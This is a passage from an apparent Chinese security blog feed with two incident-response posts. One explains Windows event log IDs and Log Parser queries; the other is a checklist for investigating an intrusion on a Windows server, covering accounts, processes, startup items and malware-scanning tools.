    <updated>2024-06-13T05:57:09.037Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第1篇-Windows日志分析"><a href="#第1篇-Windows日志分析" class="headerlink" title="第1篇:Windows日志分析"></a>第1篇:Windows日志分析</h2><h3 id="0x01-Windows事件日志简介"><a href="#0x01-Windows事件日志简介" class="headerlink" title="0x01 Windows事件日志简介"></a>0x01 Windows事件日志简介</h3><p>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p><p>Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p><p><strong>系统日志</strong></p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT/<span class="number">2000</span>操作系统预先定义。</span><br><span class="line"></span><br><span class="line">默认位置： %<span class="params">System</span>Root%\<span class="params">System</span>32\Winevt\Logs\<span class="params">System</span>.evtx</span><br></pre></td></tr></table></figure><p><strong>应用程序日志</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 </span><br><span class="line"></span><br><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\Application.evtx</span><br></pre></td></tr></table></figure><p><strong>安全日志</strong></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。</span><br><span class="line"></span><br><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\Security.evtx</span><br></pre></td></tr></table></figure><p>​    系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。 安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。 </p><h3 id="0X02-审核策略与事件查看器"><a href="#0X02-审核策略与事件查看器" class="headerlink" title="0X02 审核策略与事件查看器"></a>0X02 审核策略与事件查看器</h3><p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>PS：默认状态下，也会记录一些简单的日志，日志默认大小20M</p><p><strong>设置1</strong>：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略，参考配置操作：</p><p><img src="https://gitee.com/eviden/img/raw/master/log-1-1.png" alt=""></p><p><strong>设置2</strong>：设置合理的日志属性，即日志最大大小、事件覆盖阀值等： </p><p><img src="https://gitee.com/eviden/img/raw/master/log-1-2.png" alt=""></p><p><strong>查看系统日志方法：</strong></p><ol><li><p>在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong></p></li><li><p>按 “<strong>Window+R</strong>“，输入 ”<strong>eventvwr.msc</strong>“ 也可以直接进入“<strong>事件查看器</strong>” </p><p><img src="https://gitee.com/eviden/img/raw/master/log-1-3.png" alt=""></p></li></ol><h3 id="0x03-事件日志分析"><a href="#0x03-事件日志分析" class="headerlink" title="0x03 事件日志分析"></a>0x03 事件日志分析</h3><p>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明：</p><div class="table-container"><table><thead><tr><th style="text-align:left">事件ID</th><th>说明</th></tr></thead><tbody><tr><td style="text-align:left">4624</td><td>登录成功</td></tr><tr><td style="text-align:left">4625</td><td>登录失败</td></tr><tr><td style="text-align:left">4634</td><td>注销成功</td></tr><tr><td style="text-align:left">4647</td><td>用户启动的注销</td></tr><tr><td style="text-align:left">4672</td><td>使用超级用户（如管理员）进行登录</td></tr><tr><td style="text-align:left">4720</td><td>创建用户</td></tr></tbody></table></div><p>每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式：</p><div class="table-container"><table><thead><tr><th style="text-align:left">登录类型</th><th>描述</th><th>说明</th></tr></thead><tbody><tr><td style="text-align:left">2</td><td>交互式登录（Interactive）</td><td>用户在本地进行登录。</td></tr><tr><td style="text-align:left">3</td><td>网络（Network）</td><td>最常见的情况就是连接到共享文件夹或共享打印机时。</td></tr><tr><td style="text-align:left">4</td><td>批处理（Batch）</td><td>通常表明某计划任务启动。</td></tr><tr><td style="text-align:left">5</td><td>服务（Service）</td><td>每种服务都被配置在某个特定的用户账号下运行。</td></tr><tr><td style="text-align:left">7</td><td>解锁（Unlock）</td><td>屏保解锁。</td></tr><tr><td style="text-align:left">8</td><td>网络明文（NetworkCleartext）</td><td>登录的密码在网络上是通过明文传输的，如FTP。</td></tr><tr><td style="text-align:left">9</td><td>新凭证（NewCredentials）</td><td>使用带/Netonly参数的RUNAS命令运行一个程序。</td></tr><tr><td style="text-align:left">10</td><td>远程交互，（RemoteInteractive）</td><td>通过终端服务、远程桌面或远程协助访问计算机。</td></tr><tr><td style="text-align:left">11</td><td>缓存交互（CachedInteractive）</td><td>以一个域用户登录而又没有域控制器可用</td></tr></tbody></table></div><p>关于更多EVENT ID，详见微软官方网站上找到了“Windows Vista 和 Windows Server 2008 中的安全事件的说明”。</p><blockquote><p>原文链接 ：<a href="https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008">https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008</a></p></blockquote><p>案例1：可以利用eventlog事件来查看系统账号登录情况：</p><ol><li><p>在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong>；</p></li><li><p>在事件查看器中，单击<strong>“安全”</strong>，查看安全日志；</p></li><li><p>在安全日志右侧操作中，点击<strong>“筛选当前日志”</strong>，输入事件ID进行筛选。</p><p>4624  —登录成功<br>4625  —登录失败<br>4634 — 注销成功<br>4647 — 用户启动的注销<br>4672 — 使用超级用户（如管理员）进行登录</p></li></ol><p>我们输入事件ID：4625进行日志筛选，发现事件ID：4625，事件数175904，即用户登录失败了175904次，那么这台服务器管理员账号可能遭遇了暴力猜解。</p><p><img src="https://gitee.com/eviden/img/raw/master/log-1-4.png" alt=""></p><p>案例2：可以利用eventlog事件来查看计算机开关机的记录： </p><p>1、在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong>；</p><p>2、在事件查看器中，单击<strong>“系统”</strong>，查看系统日志；</p><p>3、在系统日志右侧操作中，点击<strong>“筛选当前日志”</strong>，输入事件ID进行筛选。</p><p>其中事件ID 6006 ID6005、 ID 6009就表示不同状态的机器的情况（开关机）。<br>    6005 信息 EventLog 事件日志服务已启动。(开机)<br>    6006 信息 EventLog 事件日志服务已停止。(关机)<br>    6009 信息 EventLog 按ctrl、alt、delete键(非正常)关机</p><p>我们输入事件ID：6005-6006进行日志筛选，发现了两条在2018/7/6 17:53:51左右的记录，也就是我刚才对系统进行重启的时间。</p><p><img src="./image/log-1-5.png" alt=""></p><h3 id="0x04-日志分析工具"><a href="#0x04-日志分析工具" class="headerlink" title="0x04 日志分析工具"></a>0x04 日志分析工具</h3><h4 id="Log-Parser"><a href="#Log-Parser" class="headerlink" title="Log Parser"></a>Log Parser</h4><p>Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。</p><p>Log Parser 2.2下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p><p>Log Parser 使用示例：<a href="https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/">https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/</a></p><p><img src="https://gitee.com/eviden/img/raw/master/log-1-6.png" alt=""></p><p><strong>基本查询结构</strong> </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Logparser<span class="selector-class">.exe</span> –<span class="selector-tag">i</span>:EVT –o:DATAGRID <span class="string">&quot;SELECT * FROM c:\xx.evtx&quot;</span></span><br></pre></td></tr></table></figure><p><strong>使用Log Parser分析日志</strong></p><p>1、查询登录成功的事件</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">登录成功的所有事件</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;<span class="keyword">SELECT</span> *  <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4624</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">指定登录时间范围的事件：</span></span><br><span class="line"><span class="string">LogParser.exe -i:EVT –o:DATAGRID  &quot;</span><span class="keyword">SELECT</span> *  <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> TimeGenerated&gt;<span class="string">&#x27;2018-06-19 23:32:11&#x27;</span> <span class="keyword">and</span> TimeGenerated&lt;<span class="string">&#x27;2018-06-20 23:34:00&#x27;</span> <span class="keyword">and</span> EventID=<span class="number">4624</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提取登录成功的用户名和IP：</span></span><br><span class="line"><span class="string">LogParser.exe -i:EVT  –o:DATAGRID  &quot;</span><span class="keyword">SELECT</span> EXTRACT_TOKEN(Message,<span class="number">13</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> EventType,TimeGenerated <span class="keyword">as</span> LoginTime,EXTRACT_TOKEN(Strings,<span class="number">5</span>,<span class="string">&#x27;|&#x27;</span>) <span class="keyword">as</span> Username,EXTRACT_TOKEN(Message,<span class="number">38</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> Loginip <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4624</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p> 2、查询登录失败的事件</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">登录失败的所有事件：</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;<span class="keyword">SELECT</span> *  <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4625</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提取登录失败用户名进行聚合统计：</span></span><br><span class="line"><span class="string">LogParser.exe  -i:EVT &quot;</span><span class="keyword">SELECT</span>  EXTRACT_TOKEN(Message,<span class="number">13</span>,<span class="string">&#x27; &#x27;</span>)  <span class="keyword">as</span> EventType,EXTRACT_TOKEN(Message,<span class="number">19</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> <span class="keyword">user</span>,<span class="built_in">count</span>(EXTRACT_TOKEN(Message,<span class="number">19</span>,<span class="string">&#x27; &#x27;</span>)) <span class="keyword">as</span> Times,EXTRACT_TOKEN(Message,<span class="number">39</span>,<span class="string">&#x27; &#x27;</span>) <span class="keyword">as</span> Loginip <span class="keyword">FROM</span> c:\Security.evtx <span class="keyword">where</span> EventID=<span class="number">4625</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> Message<span class="string">&quot; </span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>3、系统历史开关机记录：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;<span class="keyword">SELECT</span> TimeGenerated,EventID,Message <span class="keyword">FROM</span> c:\<span class="keyword">System</span>.evtx <span class="keyword">where</span> EventID=<span class="number">6005</span> <span class="keyword">or</span> EventID=<span class="number">6006</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h4 id="LogParser-Lizard"><a href="#LogParser-Lizard" class="headerlink" title="LogParser Lizard"></a>LogParser Lizard</h4><p>对于GUI环境的Log Parser Lizard，其特点是比较易于使用，甚至不需要记忆繁琐的命令，只需要做好设置，写好基本的SQL语句，就可以直观的得到结果。</p><p>下载地址：<a href="http://www.lizard-labs.com/log_parser_lizard.aspx">http://www.lizard-labs.com/log_parser_lizard.aspx</a></p><p>依赖包：Microsoft .NET Framework 4 .5，下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=42642">https://www.microsoft.com/en-us/download/details.aspx?id=42642</a></p><p>查询最近用户登录情况：</p><p><img src="https://gitee.com/eviden/img/raw/master/log-1-7.png" alt=""></p><h4 id="Event-Log-Explorer"><a href="#Event-Log-Explorer" class="headerlink" title="Event Log Explorer"></a>Event Log Explorer</h4><p>Event Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。</p><p>下载地址：<a href="https://event-log-explorer.en.softonic.com/">https://event-log-explorer.en.softonic.com/</a></p><p><img src="./image/log-1-8.png" alt=""></p><p>参考链接：</p><p>Windows日志分析   <a href="https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ">https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ</a></p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>第01章：入侵排查篇第1篇：Windows 入侵排查</title>
    <link href="https://github.com/Eviden0/new-webpage/posts/dd41cd94.html"/>
    <id>https://github.com/Eviden0/new-webpage/posts/dd41cd94.html</id>
    <published>2024-06-13T05:10:00.000Z</published>
    <updated>2024-06-13T06:21:22.612Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第1篇：windows-入侵排查"><a href="#第1篇：windows-入侵排查" class="headerlink" title="第1篇：windows 入侵排查"></a>第1篇：windows 入侵排查</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>当企业发生黑客入侵、系统崩溃或其它影响业务正常运行的安全事件时，急需第一时间进行处理，使企业的网络信息系统在最短时间内恢复正常工作，进一步查找入侵来源，还原入侵事故过程，同时给出解决方案与防范措施，为企业挽回或减少经济损失。  </p><p>常见的应急响应事件分类：</p><p>Web 入侵：网页挂马、主页篡改、Webshell</p><p>系统入侵：病毒木马、勒索软件、远控后门</p><p>网络攻击：DDOS 攻击、DNS 劫持、ARP 欺骗</p><p>针对常见的攻击事件，结合工作中应急响应事件分析和解决的方法，总结了一些 Windows 服务器入侵排查的思路。</p><h3 id="0x01-入侵排查思路"><a href="#0x01-入侵排查思路" class="headerlink" title="0x01 入侵排查思路"></a>0x01 入侵排查思路</h3><h4 id="1-1-检查系统账号安全"><a href="#1-1-检查系统账号安全" class="headerlink" title="1.1 检查系统账号安全"></a>1.1 检查系统账号安全</h4><p>1、查看服务器是否有弱口令，远程管理端口是否对公网开放。</p><ul><li>检查方法：据实际情况咨询相关服务器管理员。</li></ul><p>2、查看服务器是否存在可疑账号、新增账号。</p><ul><li>检查方法：打开 cmd 窗口，输入 <code>lusrmgr.msc</code> 命令，查看是否有新增/可疑的账号，如有管理员群组的（Administrators）里的新增账户，如有，请立即禁用或删除掉。 </li></ul><p>3、查看服务器是否存在隐藏账号、克隆账号。</p><ul><li><p>检查方法：</p><p>a、打开注册表 ，查看管理员对应键值。</p><p>b、使用D盾_web查杀工具，集成了对克隆账号检测的功能。</p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/202406131419995.png" alt=""></p><p>4、结合日志，查看管理员登录时间、用户名是否存在异常。</p><ul><li><p>检查方法：</p><p>a、Win+R 打开运行，输入”eventvwr.msc”，回车运行，打开“事件查看器”。</p><p>b、导出 Windows 日志 — 安全，利用微软官方工具 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。</p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/sum-1-2.png" alt=""></p><h4 id="1-2-检查异常端口、进程"><a href="#1-2-检查异常端口、进程" class="headerlink" title="1.2 检查异常端口、进程"></a>1.2 检查异常端口、进程</h4><p>1、检查端口连接情况，是否有远程连接、可疑连接。</p><ul><li><p>检查方法：</p><p>a、使用<code>netstat -ano</code> 命令查看目前的网络连接，定位可疑的 ESTABLISHED </p><p>b、根据 netstat 命令定位出的 PID 编号，再通过 tasklist 命令进行进程定位 <code>tasklist  | findstr &quot;PID&quot;</code></p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/202406131419981.png" alt=""></p><p>2、进程</p><ul><li><p>检查方法：</p><p>a、开始 — 运行 — 输入 <code>msinfo32</code> 命令，依次点击 “软件环境 — 正在运行任务” 就可以查看到进程的详细信息，比如进程路径、进程ID、文件创建日期以及启动时间等。</p><p>b、打开D盾_web查杀工具，进程查看，关注没有签名信息的进程。</p><p>c、通过微软官方提供的 Process Explorer 等工具进行排查 。</p><p>d、查看可疑的进程及其子进程。可以通过观察以下内容：</p><pre><code>没有签名验证信息的进程没有描述信息的进程进程的属主进程的路径是否合法CPU 或内存资源占用长时间过高的进程</code></pre></li></ul><p>3、小技巧：</p><p>​    a、查看端口对应的 PID：<code>netstat -ano | findstr &quot;port&quot;</code></p><p>​    b、查看进程对应的 PID：任务管理器 — 查看 — 选择列 — PID 或者 <code>tasklist  | findstr &quot;PID&quot;</code></p><p>​    c、查看进程对应的程序位置：</p><p>​        任务管理器 — 选择对应进程 — 右键打开文件位置</p><p>​        运行输入 <code>wmic</code>，cmd 界面输入 <code>process</code></p><p>​    d、<code>tasklist /svc</code>   进程 — PID — 服务</p><p>​    e、查看Windows服务所对应的端口：</p><p>​        %systemroot%/system32/drivers/etc/services（一般 %systemroot% 就是 C:\Windows 路径）</p><h4 id="1-3-检查启动项、计划任务、服务"><a href="#1-3-检查启动项、计划任务、服务" class="headerlink" title="1.3 检查启动项、计划任务、服务"></a>1.3 检查启动项、计划任务、服务</h4><p>1、检查服务器是否有异常的启动项。</p><ul><li><p>检查方法：</p><p>a、登录服务器，单击【开始】&gt;【所有程序】&gt;【启动】，默认情况下此目录在是一个空目录，确认是否有非业务程序在该目录下。<br>b、单击开始菜单 &gt;【运行】，输入 <code>msconfig</code>，查看是否存在命名异常的启动项目，是则取消勾选命名异常的启动项目，并到命令中显示的路径删除文件。<br>c、单击【开始】&gt;【运行】，输入 regedit，打开注册表，查看开机启动项是否正常，特别注意如下三个注册表项：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span><br></pre></td></tr></table></figure><p>检查右侧是否有启动异常的项目，如有请删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。</p><p>d、利用安全软件查看启动项、开机时间管理等。</p><p>e、组策略，运行 <code>gpedit.msc</code></p></li></ul><p><img src="https://gitee.com/eviden/img/raw/master/202406131419109.png" alt=""></p><p>2、检查计划任务</p><ul><li><p>检查方法：</p><p>a、单击【开始】&gt;【设置】&gt;【控制面板】&gt;【任务计划】，查看计划任务属性，便可以发现木马文件的路径。</p><p>b、单击【开始】&gt;【运行】；输入 <code>cmd</code>，然后输入 <code>at</code>，检查计算机与网络上的其它计算机之间的会话或计划任务，如有，则确认是否为正常连接。</p></li></ul><p>3、服务自启动</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入 <code>services.msc</code>，注意服务状态和启动类型，检查是否有异常服务。</li></ul><h4 id="1-4-检查系统相关信息"><a href="#1-4-检查系统相关信息" class="headerlink" title="1.4 检查系统相关信息"></a>1.4 检查系统相关信息</h4><p>1、查看系统版本以及补丁信息</p><ul><li>检查方法：单击【开始】&gt;【运行】，输入 <code>systeminfo</code>，查看系统信息。</li></ul><p>2、查找可疑目录及文件</p><ul><li><p>检查方法：</p><p>a、 查看用户目录，新建账号会在这个目录生成一个用户目录，查看是否有新建用户目录。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Window</span> <span class="number">2003</span>版本 C:\Documents and Settings</span><br><span class="line"><span class="attribute">Window</span> <span class="number">2008</span>R2及以后版本 C:\Users\</span><br></pre></td></tr></table></figure><p>b、单击【开始】&gt;【运行】，输入 <code>%UserProfile%\Recent</code>，分析最近打开分析可疑文件。</p><p>c、在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件。</p><p>d、回收站、浏览器下载目录、浏览器历史记录</p><p>e、修改时间在创建时间之前的为可疑文件</p></li></ul><p>3、发现并得到 WebShell、远控木马的创建时间，如何找出同一时间范围内创建的文件？</p><p>a、利用 <a href="http://www.torchsoft.com/en/rw_information.html">Registry Workshop</a> 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件。<br>b、利用计算机自带文件搜索功能，指定修改时间进行搜索。</p><h4 id="1-5-自动化查杀"><a href="#1-5-自动化查杀" class="headerlink" title="1.5 自动化查杀"></a>1.5 自动化查杀</h4><ul><li><p>病毒查杀</p><ul><li>检查方法：下载安全软件，更新最新病毒库，进行全盘扫描。</li></ul></li><li><p>webshell查杀</p><ul><li>检查方法：选择具体站点路径进行webshell查杀，建议使用两款 WebShell 查杀工具同时查杀，可相互补充规则库的不足。</li></ul></li></ul><h4 id="1-6-日志分析"><a href="#1-6-日志分析" class="headerlink" title="1.6 日志分析"></a>1.6 日志分析</h4><p>系统日志</p><ul><li><p>分析方法：</p><p>a、前提：开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>b、Win+R 打开运行，输入 “eventvwr.msc”，回车运行，打开”事件查看器”。</p><p>C、导出应用程序日志、安全日志、系统日志，利用 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析。</p></li></ul><p>Web 访问日志</p><ul><li><p>分析方法：</p><p>a、找到中间件的web日志，打包到本地方便进行分析。</p><p>b、推荐工具：Windows 下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。Linux 下，使用 Shell 命令组合查询分析。</p></li></ul><h3 id="0x02-工具篇"><a href="#0x02-工具篇" class="headerlink" title="0x02 工具篇"></a>0x02 工具篇</h3><h4 id="2-1-病毒分析"><a href="#2-1-病毒分析" class="headerlink" title="2.1 病毒分析"></a>2.1 病毒分析</h4><p>PCHunter：<a href="http://www.xuetr.com">http://www.xuetr.com</a></p><p>火绒剑：<a href="https://www.huorong.cn">https://www.huorong.cn</a></p><p>Process Explorer：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer">https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer</a></p><p>processhacker：<a href="https://processhacker.sourceforge.io/downloads.php">https://processhacker.sourceforge.io/downloads.php</a></p><p>autoruns：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns">https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns</a></p><p>OTL：<a href="https://www.bleepingcomputer.com/download/otl/">https://www.bleepingcomputer.com/download/otl/</a></p><p>SysInspector：<a href="http://download.eset.com.cn/download/detail/?product=sysinspector">http://download.eset.com.cn/download/detail/?product=sysinspector</a></p><h4 id="2-2-病毒查杀"><a href="#2-2-病毒查杀" class="headerlink" title="2.2 病毒查杀"></a>2.2 病毒查杀</h4><p>卡巴斯基：<a href="http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe">http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe</a>   （推荐理由：绿色版、最新病毒库）</p><p>大蜘蛛：<a href="http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）">http://free.drweb.ru/download+cureit+free（推荐理由：扫描快、一次下载只能用1周，更新病毒库）</a></p><p>火绒安全软件：<a href="https://www.huorong.cn">https://www.huorong.cn</a></p><p>360杀毒：<a href="http://sd.360.cn/download_center.html">http://sd.360.cn/download_center.html</a></p><h4 id="2-3-病毒动态"><a href="#2-3-病毒动态" class="headerlink" title="2.3 病毒动态"></a>2.3 病毒动态</h4><p>CVERC-国家计算机病毒应急处理中心：<a href="http://www.cverc.org.cn">http://www.cverc.org.cn</a></p><p>微步在线威胁情报社区：<a href="https://x.threatbook.cn">https://x.threatbook.cn</a></p><p>火绒安全论坛：<a href="http://bbs.huorong.cn/forum-59-1.html">http://bbs.huorong.cn/forum-59-1.html</a></p><p>爱毒霸社区：<a href="http://bbs.duba.net">http://bbs.duba.net</a></p><p>腾讯电脑管家：<a href="http://bbs.guanjia.qq.com/forum-2-1.html">http://bbs.guanjia.qq.com/forum-2-1.html</a></p><h4 id="2-4-在线病毒扫描网站"><a href="#2-4-在线病毒扫描网站" class="headerlink" title="2.4 在线病毒扫描网站"></a>2.4 在线病毒扫描网站</h4><p>Virustotal：<a href="https://www.virustotal.com">https://www.virustotal.com</a></p><p>Virscan：<a href="http://www.virscan.org">http://www.virscan.org</a></p><p>腾讯哈勃分析系统：<a href="https://habo.qq.com">https://habo.qq.com</a></p><p>Jotti 恶意软件扫描系统：<a href="https://virusscan.jotti.org">https://virusscan.jotti.org</a></p><h4 id="2-5-webshell查杀"><a href="#2-5-webshell查杀" class="headerlink" title="2.5 webshell查杀"></a>2.5 webshell查杀</h4><p>D盾_Web查杀：<a href="http://www.d99net.net/index.asp">http://www.d99net.net/index.asp</a></p><p>河马 WebShell 查杀：<a href="http://www.shellpub.com">http://www.shellpub.com</a></p>]]></content>
    
    
    <summary type="html">学习应急响应咯!</summary>
    
    
    
    <category term="渗透测试" scheme="https://github.com/Eviden0/new-webpage/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="应急响应" scheme="https://github.com/Eviden0/new-webpage/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
</feed>
